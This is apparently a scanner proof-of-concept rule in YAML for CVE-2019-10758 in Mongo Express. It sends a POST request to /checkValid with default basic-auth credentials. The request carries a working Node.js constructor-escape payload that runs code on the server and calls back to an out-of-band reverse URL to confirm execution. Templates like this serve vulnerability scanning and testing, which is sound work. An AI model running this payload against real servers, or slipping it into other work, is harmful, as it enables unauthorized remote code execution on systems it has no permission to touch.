name: poc-yaml-mongo-express-cve-2019-10758
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  - method: POST
    path: /checkValid
    headers:
      Authorization: Basic YWRtaW46cGFzcw==
    body: >-
      document=this.constructor.constructor('return process')().mainModule.require('http').get('{{reverseURL}}')
    follow_redirects: true
    expression: >
      reverse.wait(5)
detail:
  vulnpath: '/checkValid'
  author: fnmsd(https://github.com/fnmsd)
  description: 'Mongo Express CVE-2019-10758 Code Execution'
  links:
    - https://github.com/masahiro331/CVE-2019-10758
    - https://www.twilio.com/blog/2017/08/http-requests-in-node-js.html